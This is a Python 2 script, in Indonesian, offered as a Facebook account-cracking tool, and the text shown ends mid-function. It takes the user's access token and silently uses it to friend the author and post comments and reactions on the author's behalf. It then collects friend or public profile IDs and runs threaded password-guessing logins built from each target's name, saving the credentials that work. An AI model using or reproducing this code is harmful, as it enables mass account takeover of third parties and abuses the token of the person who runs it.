#!/usr/bin/python2
# coding=utf-8
import os,sys,time,mechanize,itertools,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool

#### WARNA RANDOM ####
P  = '\033[1;97m'  # putih
M  = '\033[1;91m' # merah
H  = '\033[1;92m' # hijau
K = '\033[1;93m' # kuning
B  = '\033[1;94m' # biru
U  = '\033[1;95m' # ungu
O = '\033[1;96m' # biru muda

my_color = [P, M, H, K, B, U, O]
warna = random.choice(my_color)
warni = random.choice(my_color)

try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
	os.system("python2 simpel.py")
from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import datetime

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

os.system("clear")
done = False
def animate():
    for c in itertools.cycle(['\033[1;96m|', '\033[1;92m/', '\033[1;95m-', '\033[1;91m\\']):
        if done:
            break
        sys.stdout.write('\r\033[1;93mLoading ' + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c )
        sys.stdout.flush()
        time.sleep(0.1)
 
t = threading.Thread(target=animate)
t.start()
 
time.sleep(5)
done = True

def keluar():
	print "\033[1;97m{\033[1;91m!\033[1;97m} Keluar"
	os.sys.exit()
	
	
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
    
    
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'%s;'%str(31+j))
    x += ''
    x = x.replace('!0','')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
		
#########LOGO#########
logo = """\033[0;93m█████████
\033[0;93m█▄█████▄█      \033[0;91m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
\033[0;93m█\033[0;92m▼▼▼▼▼ \033[0;92m- _ --_--\033[0;95m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗
\033[0;93m█ \033[0;92m \033[0;92m_-_-- -_ --__\033[0;93m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗
\033[0;93m█\033[0;92m▲▲▲▲▲\033[0;92m--  - _ --\033[0;96m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ 
\033[0;93m█████████      \033[0;92m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
\033[0;93m ██ ██
\033[0;39m[\033[0;92m•\033[0;39m] Author   : 𝗔𝗻𝗱𝗿𝗲 𝗣𝗿𝗮𝘁𝗮𝗺𝗮
\033[1;39m\033[1;41;39mヅ︻写፨丐יי一一一 ҉ ㄹㅇㄹㅇ \033[0m
\033[1;94m──────────────────────────────────────────────────
\033[1;95m[\033[1;96m•\033[1;95m] \033[1;93mAuthor\033[1;91m: \033[1;96mAndre Pratama
\033[1;95m[\033[1;96m•\033[1;95m] \033[1;93mWhatsapp\033[1;91m: \033[1;96m089519116498
\033[1;95m[\033[1;96m•\033[1;95m] \033[1;93mFacebook\033[1;91m: \033[1;96mアンドレプラタマ
\033[1;94m──────────────────────────────────────────────────"""

back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
id = []

###### MASUK ######
def masuk():
	os.system('clear')
	print logo
	print 50* "\033[1;94m─"
	print "\033[1;97m[\033[1;92m01\033[1;97m] Login Via Token Facebook"
	print "\033[1;97m[\033[1;92m02\033[1;97m] Ambil Token Download Token App"
	print "\033[1;97m[\033[1;92m03\033[1;97m] Ambil Token Dari Link"
	print "\033[1;97m[\033[1;91m00\033[1;97m] Keluar"
	print 50* "\033[1;94m─"
	pilih_menu()

def pilih_masuk():
	msuk = raw_input("\033[1;90m \033[91m:\033[1;92m ")
	if msuk =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m] Isi Yg Benar !"
		pilih_menu()
	elif msuk =="1" or msuk =="01":
		tokenz()
	elif msuk =="0" or msuk =="00":
		keluar()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m] Isi Yg Benar !"
		pilih_masuk()
			
#####LOGIN_TOKENZ#####
def login():
    os.system('clear')
    print logo
    toket = raw_input('\033[1;97m[\033[1;95m•\033[1;97m] Token Facebook\033[1;91m :\033[1;92m ')
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        print '\033[1;97m{\033[1;92m✓\033[1;97m}\033[1;92m Alhamdulillah Masuk'
        os.system('xdg-open https://m.facebook.com/100052292505058')
        bot_komen()
    except KeyError:
        print "\033[1;97m[\033[1;91m!\033[1;97m] \033[1;91mToken salah Kontol !"
        time.sleep(1.7)
        login()

###### BOT KOMEN #######
def bot_komen():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m[!] Token invalid"
		os.system('rm -rf login.txt')
	una = ('100052292505058')
	kom = ('saya mau masuk neraka bang 😁')
	reac = ('ANGRY')
	post = ('185535143199568')
	post2 = ('185535143199568')
	kom2 = ('bang andre ganteng 😍')
	reac2 = ('LOVE')
	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
	menu()

###### MENU #######
def menu():
	os.system('clear')
	try:
		toket = open('login.txt','r').read()
	except IOError:
		print "{!} Token Invalid !"
		os.system('clear')
		os.system('rm -rf login.txt')
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;96m[!] \033[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		masuk()
		time.sleep(1)
		masuk()
	except requests.exceptions.ConnectionError:
		print"{!} Tidak ada koneksi"
		keluar()
	os.system("clear")
	print logo
	print 50* "\033[1;94m─"
	print "\033[1;97m[\033[1;96m•\033[1;97m]\033[1;95m Nama\033[1;90m    ➣\033[1;92m " +nama
	print "\033[1;97m[\033[1;96m•\033[1;97m]\033[1;95m User ID\033[1;90m ➣\033[1;92m " + id
	print 50* "\033[1;94m─"
	print "\033[1;97m["+warni+"01\033[1;97m]"+warna+" Crack ID Dari Teman/Publik"
	print "\033[1;97m["+warni+"02\033[1;97m]"+warna+" Crack ID Dari Postingan Grup/Teman"
	print "\033[1;97m["+warni+"03\033[1;97m]"+warna+" Crack ID Dari Total Followers"
	print "\033[1;97m["+warni+"04\033[1;97m]"+warna+" Cari ID Menggunakan Username"
	print "\033[1;97m["+warni+"05\033[1;97m]"+warna+" Perbarui Script"
	print "\033[1;97m[\033[1;91m00\033[1;97m]"+warna+" Keluar"
	print 50* "\033[1;94m─"
	pilih()
	
######PILIH######
def pilih():
	unikers = raw_input("\033[1;92m➣➣\033[91m:\033[1;92m ")
	if unikers =="":
		print"\033[1;97m{\033[1;91m!\033[1;97m}\033[1;97m Isi Yg Benar !"
		pilih()
	elif unikers =="1" or unikers =="01":
		crack_teman()
	elif unikers =="2" or unikers =="02":
		crack_likes()
	elif unikers =="3" or unikers =="03":
		crack_follow()
	elif unikers =="4" or unikers =="04":
		user_id()
	elif unikers =="5" or unikers =="05":
		perbarui()
	elif unikers =="0" or unikers =="00":
		os.system('clear')
		jalan('Menghapus token')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print"\033[1;97m{\033[1;91m!\033[1;97m}\033[1;97m Isi Yg Benar !"
		pilih()
		
##### CRACK TEMAN/PUBLIK #####
def crack_teman():
	os.system("clear")
	print logo
	print 50* "\033[1;94m─"
	print "\033[1;97m["+warna+"01\033[1;97m]"+warni+" Crack ID Indonesia"
	print "\033[1;97m["+warna+"02\033[1;97m]"+warni+" Crack ID Bangladesh"
	print "\033[1;97m[\033[1;91m00\033[1;97m]"+warni+" Kembali"
	print 50* "\033[1;94m─"
	pilih_teman()
	
######PILIH######
def pilih_teman():
	univ = raw_input(""+warna+"➣➣\033[91m:\033[1;92m ")
	if univ =="":
		print"\033[1;97m{\033[1;91m!\033[1;97m}\033[1;97m Isi Yg Benar !"
		pilih_teman()
	elif univ =="1" or univ =="01":
		crack_indo() 
	elif univ =="2" or univ =="02":
		crack_bangla()
	elif univ =="0" or univ =="00":
		menu()
	else:
		print"\033[1;97m{\033[1;91m!\033[1;97m}\033[1;97m Isi Yg Benar !"
		pilih_teman()
		
##### CRACK INDONESIA #####
def crack_indo():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print 50* "\033[1;94m─"
	print "\033[1;97m[\033[1;93m01\033[1;97m] Crack Dari Daftar Teman"
	print "\033[1;97m[\033[1;93m02\033[1;97m] Crack Dari Publik/Teman"
	print "\033[1;97m[\033[1;93m03\033[1;97m] Crack Dari File"
	print "\033[1;97m[\033[1;91m00\033[1;97m] Kembali"
	print 50* "\033[1;94m─"
	pilih_indo()

#### PILIH INDONESIA ####
def pilih_indo():
	teak = raw_input("\033[1;93m ➣➣\033[91m:\033[1;92m ")
	if teak =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih_indo()
	elif teak =="1" or teak =="01":
		os.system('clear')
		print logo
		print 50* "\033[1;94m─"
		print ("             \033[1;93m[●●● \033[1;97mCrack Indonesia \033[1;93m●●●]")
		print 50* "\033[1;94m─"
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2" or teak =="02":
		os.system('clear')
		print logo
		print 50* "\033[1;94m─"
		print ("             \033[1;93m[●●● \033[1;97mCrack Indonesia \033[1;93m●●●]")
		print 50* "\033[1;94m─"
		idt = raw_input("\033[1;97m[\033[1;93m●\033[1;97m] \033[1;93mID Publik/Teman \033[1;91m:\033[1;92m ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			sp = json.loads(pok.text)
			print"\033[1;97m{\033[1;93m●\033[1;97m}\033[1;93m Nama \033[1;91m:\033[1;92m "+sp["name"]
		except KeyError:
			print"\033[1;97m{\033[1;91m!\033[1;97m} ID publik/teman tidak ada !"
			raw_input("\n\033[1;93m{\033[1;97m<Kembali>\033[1;93m}")
			crack_indo()
		except requests.exceptions.ConnectionError:
			print"\033[1;97m{\033[1;91m!\033[1;97m} Tidak ada koneksi !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="3" or teak =="03":
		os.system('clear')
		print logo
		try:
			print 50* "\033[1;94m─"
			print ("             \033[1;93m[●●● \033[1;97mCrack Indonesia \033[1;93m●●●]")
			print 50* "\033[1;94m─"
			idlist = raw_input('\033[1;97m[\033[1;93m●\033[1;97m] \033[1;93mNama File\033[1;91m :\033[1;92m ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[1;97m[\033[1;91m!\033[1;97m] File tidak ada ! '
			raw_input('\n\033[1;92m[ \033[1;97mKembali \033[1;92m]')
		except IOError:
			print '\033[1;97m{\033[1;91m!\033[1;97m} File tidak ada !'
			raw_input("\n\033[1;93m{\033[1;97m<Kembali>\033[1;93m}")
			crack_indo()
	elif teak =="0" or teak =="00":
		menu()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih_indo()
	
	print "\033[1;97m[\033[1;93m●\033[1;97m] \033[1;93mTotal ID \033[1;91m:\033[1;92m "+str(len(id))
	print('\033[1;97m[\033[1;93m●\033[1;97m] \033[1;93mStop Tekan CTRL+Z')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m[\033[1;93m●\033[1;97m] \033[1;93mCrack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print("\n\033[1;97m[\033[1;93m●\033[1;97m] \033[1;93mBuang Handphone Jika Tidak Ada Hasil")
	print ("\033[1;94m──────────────────────────────────────────────────")
	
##### MAIN INDONESIA #####
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass 
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name'].lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\033[0;92m[OK] \033[0;39m ' + user  + ' \033[0;39m | \033[0;39m ' + pass1 + '\033[0;39m | \033[0;39m' + b['name']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[0;36;0;93m[CP] \033[0;39m ' + user  + ' \x1b[0;36;39m | \033[0;39m ' + pass1 + '\033[0;39m | \033[0;39m' + b['name']
					cek = open("out/CP.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name'].lower()+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\033[0;93m[OK] \033[0;39m ' + user  + ' \033[0;39m | \033[0;39m ' + pass2 + '\033[0;39m | \033[0;39m' + b['name']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[0;36;0;93m[CP] \033[0;39m ' + user  + ' \x1b[0;36;0;39m | \033[0;39m ' + pass2 + '\033[0;39m | \033[0;39m' + b['name']
							cek = open("out/CP.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'].lower()+'12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\033[0;92m[OK] \033[0;39m ' + user  + ' \033[0;39m | \033[0;39m ' + pass3 + '\033[0;39m | \033[0;39m' + b['name']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[0;0;93m[CP] \033[0;39m ' + user  + ' \x1b[0;36;0;39m | \033[0;39m ' + pass3 + '\033[0;39m | \033[0;39m' + b['name']
									cek = open("out/CP.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass4)
								else:
									pass4 = '786786'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\033[0;92m[OK] \033[0;39m ' + user  + ' \033[0;39m | \033[0;39m ' + pass4 + '\033[0;39m | \033[0;39m' + b['name']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[0;90;0;93m[CP] \033[0;39m ' + user  + ' \x1b[0;36;0;39m | \033[0;39m ' + pass4 + '\033[0;39m | \033[0;39m' + b['name']
											cek = open("out/CP.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = 'bangladesh'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\033[0;92m[OK] \033[0;39m ' + user  + ' \x1b[0;36;39m | \033[0;39m ' + pass5 + '\033[0;39m | \033[0;39m' + b['name']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[0;0;93m[CP] \033[0;39m ' + user  + ' \x1b[0;0;39m | \033[0;39m ' + pass5 + '\033[0;39m | \033[0;39m' + b['name']
													cek = open("out/CP.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['first_name'].lower()+'786'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\033[0;92m[OK] \033[0;39m ' + user  + ' \x1b[0;36;39m | \033[0;39m ' + pass6 + '\033[0;39m | \033[0;39m' + b['name']
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[0;0;93m[CP] \033[0;39m ' + user  + ' \x1b[0;0;39m | \033[0;39m ' + pass6 + '\033[0;39m | \033[0;39m' + b['name']
															cek = open("out/CP.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = b['last_name'].lower()+'123'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\033[0;92m[OK] \033[0;39m ' + user  + ' \x1b[0;36;39m | \033[0;39m ' + pass7 + '\033[0;39m | \033[0;39m' + b['name']
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[0;0;93m[CP] \033[0;39m ' + user  + ' \x1b[0;0;39m | \033[0;39m ' + pass7 + '\033[0;39m | \033[0;39m' + b['name']
																	cek = open("out/CP.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																else:
																	pass8 = b['last_name'].lower()+'234'
																	data = urllib.urlopen("https://b-api.facebook.com/methode/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f522ef6")
																	q = json.load(data)
																	if 'access_token' in q:
																		print '\033[0;92m[OK] \033[0;39m '+ user + ' \x1b[0;36;39m | \033[0;39m ' + pass8 + '\033[0;39m | \033[0;39m' + b['name']
																		oks.append(user+pass8)
																	else:
																		if 'www.facebook.com' in q["error_msg"]:
																			print '\x1b[0;0;93m[CP] \033[0;0;39m ' + user + '\x1b[0;0;39m | \033[0;39m ' + pass8 + '\033[0;39mm | \033[0;39m' + b['name']
																			cek = open("out/CP.txt", "a")
																			cek.close()
																			cekpoint.append(user+pass8)
																			
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print '\033[1;97m{\033[1;93m●\033[1;97m} \033[1;93mSelesai ...'
	print"\033[1;97m{\033[1;93m●\033[1;97m} \033[1;93mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print '\033[1;97m{\033[1;93m●\033[1;97m} \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;93mfile tersimpan \033[1;91m: \033[1;92mdone/indo.txt'
	print 50* "\033[1;94m─"
	raw_input("\033[1;97m{<\033[1;93mKembali\033[1;97m>}")
	os.system("python2 hekel.py")
	
##### CRACK BANGLADESH #####
def crack_bangla():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m{\x1b[1;91m!\x1b[1;97m} Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print 50* "\033[1;94m─"
	print "\033[1;97m{\033[1;96m01\033[1;97m} Crack Dari Daftar Teman"
	print "\033[1;97m{\033[1;96m02\033[1;97m} Crack Dari Publik/Teman"
	print "\033[1;97m{\033[1;96m03\033[1;97m} Crack Dari File"
	print "\033[1;97m{\033[1;91m00\033[1;97m} Kembali"
	print 50* "\033[1;94m─"
	pilih_bangla()

#### PILIH BANGLADESH ####
def pilih_bangla():
	teak = raw_input("\033[1;96m➣➣\033[91m:\033[1;92m ")
	if teak =="":
		print"\033[1;97m{\033[1;91m!\033[1;97m} Isi Yg Benar !"
		pilih_bangla()
	elif teak =="1" or teak =="01":
		os.system('clear')
		print logo
		print 50* "\033[1;94m─"
		print ("          [\033[1;96m●●● \033[1;97mCRACK BANGLADESH \033[1;96m●●●]")
		print 50* "\033[1;94m─"
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2" or teak =="02":
		os.system('clear')
		print logo
		print 50* "\033[1;94m─"
		print ("[\033[1;96m●●● \033[1;97mCRACK BANGLADESH \033[1;96m●●●]")
		print 50* "\033[1;94m─"
		idb = raw_input("\033[1;97m[\033[1;96m●\033[1;97m]\033[1;96m ID Publik/Teman \033[1;91m:\033[1;92m ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idb+"?access_token="+toket)
			sp = json.loads(pok.text)
			print"\033[1;97m[\033[1;96m●\033[1;97m]\033[1;96m Nama \033[1;91m:\033[1;92m "+sp["name"]
		except KeyError:
			print"\033[1;97m[\033[1;91m!\033[1;97m] ID publik/teman tidak ada !"
			raw_input("\n\033[1;96m{\033[1;97m<Kembali>\033[1;96m}")
			crack_bangla()
		except requests.exceptions.ConnectionError:
			print"{!} Tidak ada koneksi !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idb+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="3" or teak =="03":
		os.system('clear')
		print logo
		try:
			print 50* "\033[1;94m─"
			print ("[\033[1;96m●●● \033[1;97mCRACK BANGLADESH \033[1;96m●●●]")
			print 50* "\033[1;94m─"
			idlist = raw_input('\033[1;97m[\033[1;96m●\033[1;97m]\033[1;96m Nama File \033[1;91m:\033[1;92m ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[1;97m[\033[1;91m!\033[1;97m] File tidak ada ! '
			raw_input('\n\033[1;92m[ \033[1;97mKembali \033[1;92m]')
		except IOError:
			print '\033[1;97m{\033[1;91m!\033[1;97m} File tidak ada !'
			raw_input("\n\033[1;96m{\033[1;97m<Kembali>\033[1;96m}")
			crack_bangla()
	elif teak =="0" or teak =="00":
		menu()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m] Isi Yg Benar !"
		pilih_bangla()
	
	print "\033[1;97m[\033[1;96m●\033[1;97m]\033[1;96m Total ID \033[1;91m:\033[1;92m "+str(len(id))
	print('\033[1;97m[\033[1;96m●\033[1;97m]\033[1;96m Stop Tekan CTRL+Z')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m\033[1;96m●\033[1;97m]\033[1;96m Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print("\n\033[1;97m[\033[1;96m●\033[1;97m] \033[1;96mGunakan Mode Pesawat Jika Tidak Ada Hasil")
	print ("\033[1;94m──────────────────────────────────────────────────")
	
##### MAIN BANGLADESH #####
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass 
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name'].lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\033[0;92m[OK] \033[0;39m ' + user  + ' \033[0;39m | \033[0;39m ' + pass1 + '\033[0;39m | \033[0;39m' + b['name']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[0;36;0;93m[CP] \033[0;39m ' + user  + ' \x1b[0;36;39m | \033[0;39m ' + pass1 + '\033[0;39m | \033[0;39m' + b['name']
					cek = open("out/CP.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name'].lower()+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\033[0;93m[OK] \033[0;39m ' + user  + ' \033[0;39m | \033[0;39m ' + pass2 + '\033[0;39m | \033[0;39m' + b['name']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[0;36;0;93m[CP] \033[0;39m ' + user  + ' \x1b[0;36;0;39m | \033[0;39m ' + pass2 + '\033[0;39m | \033[0;39m' + b['name']
							cek = open("out/CP.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'].lower()+'12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\033[0;92m[OK] \033[0;39m ' + user  + ' \033[0;39m | \033[0;39m ' + pass3 + '\033[0;39m | \033[0;39m' + b['name']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[0;0;93m[CP] \033[0;39m ' + user  + ' \x1b[0;36;0;39m | \033[0;39m ' + pass3 + '\033[0;39m | \033[0;39m' + b['name']
									cek = open("out/CP.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass4)
								else:
									pass4 = '786786'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\033[0;92m[OK] \033[0;39m ' + user  + ' \033[0;39m | \033[0;39m ' + pass4 + '\033[0;39m | \033[0;39m' + b['name']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[0;90;0;93m[CP] \033[0;39m ' + user  + ' \x1b[0;36;0;39m | \033[0;39m ' + pass4 + '\033[0;39m | \033[0;39m' + b['name']
											cek = open("out/CP.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = 'bangladesh'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\033[0;92m[OK] \033[0;39m ' + user  + ' \x1b[0;36;39m | \033[0;39m ' + pass5 + '\033[0;39m | \033[0;39m' + b['name']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[0;0;93m[CP] \033[0;39m ' + user  + ' \x1b[0;0;39m | \033[0;39m ' + pass5 + '\033[0;39m | \033[0;39m' + b['name']
